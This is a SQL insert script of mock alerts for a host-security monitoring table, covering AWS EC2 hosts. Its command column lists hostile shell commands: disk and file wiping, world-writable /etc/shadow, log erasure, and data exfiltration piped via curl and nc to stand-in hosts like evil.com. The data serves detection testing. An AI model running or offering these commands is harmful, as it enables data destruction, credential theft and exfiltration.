-- =====================================================
-- 模拟数据: alert_dangerous_command (高危命令告警表)
-- 数据量: 35条
-- 说明: AWS ap-southeast-1 (Singapore) 区域 EC2 实例
-- VPC CIDR: 10.0.0.0/16
-- command_type: file_delete/privilege_escalation/permission_modify/filesystem_operation/network_scan/data_exfiltration/service_stop/log_tamper
-- =====================================================

INSERT INTO alert_dangerous_command (agent_id, host_id, host_name, host_ip, command, command_type, "user", privilege_level, status, alert_time, created_at, updated_at) VALUES
-- file_delete: 文件删除
('agent-001-a1b2c3d4', 1, 'aws-web-01', '10.0.1.10', 'rm -rf /var/www/html/*', 'file_delete', 'www-data', 'normal', 0, NOW() - INTERVAL '1 hour', NOW() - INTERVAL '1 hour', NOW()),
('agent-003-i9j0k1l2', 3, 'aws-api-01', '10.0.1.20', 'rm -rf /var/lib/postgresql/backup/*', 'file_delete', 'postgres', 'normal', 1, NOW() - INTERVAL '5 hours', NOW() - INTERVAL '5 hours', NOW()),
('agent-011-o1p2q3r4', 11, 'aws-mysql-01', '10.0.3.10', 'find /var/log -name "*.log" -delete', 'file_delete', 'root', 'root', 0, NOW() - INTERVAL '30 minutes', NOW() - INTERVAL '30 minutes', NOW()),
('agent-023-k9l0m1n2', 25, 'aws-eks-master-01', '10.0.4.10', 'rm -rf /etc/kubernetes/manifests/*', 'file_delete', 'root', 'root', 0, NOW() - INTERVAL '2 hours', NOW() - INTERVAL '2 hours', NOW()),
('agent-045-u7v8w9x0', 47, 'aws-backup-01', '10.0.7.17', 'shred -u /backup/secrets.tar.gz', 'file_delete', 'backup', 'normal', 1, NOW() - INTERVAL '1 day', NOW() - INTERVAL '1 day', NOW()),

-- privilege_escalation: 权限提升
('agent-002-e5f6g7h8', 2, 'aws-web-02', '10.0.1.11', 'sudo su -', 'privilege_escalation', 'deploy', 'normal', 0, NOW() - INTERVAL '45 minutes', NOW() - INTERVAL '45 minutes', NOW()),
('agent-006-u1v2w3x4', 6, 'aws-app-01', '10.0.2.10', 'pkexec /bin/bash', 'privilege_escalation', 'appuser', 'normal', 0, NOW() - INTERVAL '3 hours', NOW() - INTERVAL '3 hours', NOW()),
('agent-028-e9f0g1h2', 30, 'aws-jenkins-01', '10.0.5.10', 'sudo -i', 'privilege_escalation', 'jenkins', 'normal', 1, NOW() - INTERVAL '8 hours', NOW() - INTERVAL '8 hours', NOW()),
('agent-024-o3p4q5r6', 26, 'aws-eks-node-01', '10.0.4.11', 'sudo /bin/bash', 'privilege_escalation', 'kubelet', 'normal', 2, NOW() - INTERVAL '2 days', NOW() - INTERVAL '2 days', NOW()),

-- permission_modify: 权限修改
('agent-001-a1b2c3d4', 1, 'aws-web-01', '10.0.1.10', 'chmod 777 /etc/passwd', 'permission_modify', 'root', 'root', 0, NOW() - INTERVAL '20 minutes', NOW() - INTERVAL '20 minutes', NOW()),
('agent-013-w9x0y1z2', 13, 'aws-pg-01', '10.0.3.12', 'chmod 4755 /usr/bin/find', 'permission_modify', 'root', 'root', 0, NOW() - INTERVAL '4 hours', NOW() - INTERVAL '4 hours', NOW()),
('agent-029-i3j4k5l6', 31, 'aws-gitlab-01', '10.0.5.11', 'chown -R git:git /var/opt/gitlab', 'permission_modify', 'root', 'root', 1, NOW() - INTERVAL '6 hours', NOW() - INTERVAL '6 hours', NOW()),
('agent-046-y1z2a3b4', 48, 'aws-ftp-01', '10.0.7.18', 'chmod 666 /etc/shadow', 'permission_modify', 'root', 'root', 0, NOW() - INTERVAL '1 hour', NOW() - INTERVAL '1 hour', NOW()),

-- filesystem_operation: 文件系统操作
('agent-041-e1f2g3h4', 43, 'aws-nfs-01', '10.0.7.13', 'mount -o remount,rw /', 'filesystem_operation', 'root', 'root', 0, NOW() - INTERVAL '2 hours', NOW() - INTERVAL '2 hours', NOW()),
('agent-021-c1d2e3f4', 21, 'aws-mq-01', '10.0.3.50', 'mkfs.ext4 /dev/xvdb1', 'filesystem_operation', 'root', 'root', 0, NOW() - INTERVAL '5 hours', NOW() - INTERVAL '5 hours', NOW()),
('agent-045-u7v8w9x0', 47, 'aws-backup-01', '10.0.7.17', 'dd if=/dev/zero of=/dev/xvda bs=512 count=1', 'filesystem_operation', 'root', 'root', 0, NOW() - INTERVAL '10 minutes', NOW() - INTERVAL '10 minutes', NOW()),
('agent-016-i1j2k3l4', 16, 'aws-es-01', '10.0.3.30', 'umount -f /data', 'filesystem_operation', 'root', 'root', 1, NOW() - INTERVAL '1 day', NOW() - INTERVAL '1 day', NOW()),

-- network_scan: 网络扫描
('agent-044-q3r4s5t6', 46, 'aws-proxy-01', '10.0.7.16', 'nmap -sS 10.0.0.0/16', 'network_scan', 'root', 'root', 0, NOW() - INTERVAL '3 hours', NOW() - INTERVAL '3 hours', NOW()),
('agent-038-s9t0u1v2', 40, 'aws-vpn-01', '10.0.7.10', 'masscan 10.0.0.0/16 -p1-65535', 'network_scan', 'root', 'root', 0, NOW() - INTERVAL '1 hour', NOW() - INTERVAL '1 hour', NOW()),
('agent-005-q7r8s9t0', 5, 'aws-gateway-01', '10.0.1.30', 'nmap -A -T4 10.0.0.0/16', 'network_scan', 'admin', 'normal', 1, NOW() - INTERVAL '12 hours', NOW() - INTERVAL '12 hours', NOW()),
('agent-020-y7z8a9b0', 20, 'aws-kafka-02', '10.0.3.41', 'zmap -p 22 10.0.0.0/8', 'network_scan', 'root', 'root', 2, NOW() - INTERVAL '3 days', NOW() - INTERVAL '3 days', NOW()),

-- data_exfiltration: 数据外传
('agent-003-i9j0k1l2', 3, 'aws-api-01', '10.0.1.20', 'pg_dumpall | curl -X POST -d @- http://evil.com/collect', 'data_exfiltration', 'postgres', 'normal', 0, NOW() - INTERVAL '15 minutes', NOW() - INTERVAL '15 minutes', NOW()),
('agent-029-i3j4k5l6', 31, 'aws-gitlab-01', '10.0.5.11', 'tar czf - /var/opt/gitlab/backups | nc 45.33.32.156 4444', 'data_exfiltration', 'git', 'normal', 0, NOW() - INTERVAL '2 hours', NOW() - INTERVAL '2 hours', NOW()),
('agent-042-i5j6k7l8', 44, 'aws-mail-01', '10.0.7.14', 'cat /var/mail/* | base64 | curl -d @- http://malicious.site/upload', 'data_exfiltration', 'root', 'root', 0, NOW() - INTERVAL '4 hours', NOW() - INTERVAL '4 hours', NOW()),
('agent-043-m9n0o1p2', 45, 'aws-ldap-01', '10.0.7.15', 'ldapsearch -x -b "dc=company,dc=com" | nc 185.220.101.35 8080', 'data_exfiltration', 'root', 'root', 1, NOW() - INTERVAL '8 hours', NOW() - INTERVAL '8 hours', NOW()),

-- service_stop: 服务停止
('agent-033-y9z0a1b2', 35, 'aws-prometheus-01', '10.0.6.10', 'systemctl stop prometheus', 'service_stop', 'root', 'root', 0, NOW() - INTERVAL '30 minutes', NOW() - INTERVAL '30 minutes', NOW()),
('agent-014-a3b4c5d6', 14, 'aws-redis-01', '10.0.3.20', 'redis-cli shutdown', 'service_stop', 'redis', 'normal', 0, NOW() - INTERVAL '6 hours', NOW() - INTERVAL '6 hours', NOW()),
('agent-021-c1d2e3f4', 21, 'aws-mq-01', '10.0.3.50', 'rabbitmqctl stop_app', 'service_stop', 'rabbitmq', 'normal', 1, NOW() - INTERVAL '1 day', NOW() - INTERVAL '1 day', NOW()),
('agent-040-a7b8c9d0', 42, 'aws-dns-01', '10.0.7.12', 'systemctl disable named && systemctl stop named', 'service_stop', 'root', 'root', 0, NOW() - INTERVAL '2 hours', NOW() - INTERVAL '2 hours', NOW()),
('agent-023-k9l0m1n2', 25, 'aws-eks-master-01', '10.0.4.10', 'systemctl stop kubelet', 'service_stop', 'root', 'root', 0, NOW() - INTERVAL '1 hour', NOW() - INTERVAL '1 hour', NOW()),

-- log_tamper: 日志篡改
('agent-001-a1b2c3d4', 1, 'aws-web-01', '10.0.1.10', 'echo "" > /var/log/auth.log', 'log_tamper', 'root', 'root', 0, NOW() - INTERVAL '40 minutes', NOW() - INTERVAL '40 minutes', NOW()),
('agent-035-g7h8i9j0', 37, 'aws-elk-01', '10.0.6.12', 'sed -i "/Failed password/d" /var/log/secure', 'log_tamper', 'root', 'root', 0, NOW() - INTERVAL '3 hours', NOW() - INTERVAL '3 hours', NOW()),
('agent-037-o5p6q7r8', 39, 'aws-alertmanager-01', '10.0.6.14', 'shred -zu /var/log/secure && rm -f /var/log/audit/audit.log', 'log_tamper', 'root', 'root', 0, NOW() - INTERVAL '5 hours', NOW() - INTERVAL '5 hours', NOW()),
('agent-028-e9f0g1h2', 30, 'aws-jenkins-01', '10.0.5.10', 'history -c && rm ~/.bash_history', 'log_tamper', 'jenkins', 'normal', 1, NOW() - INTERVAL '10 hours', NOW() - INTERVAL '10 hours', NOW());
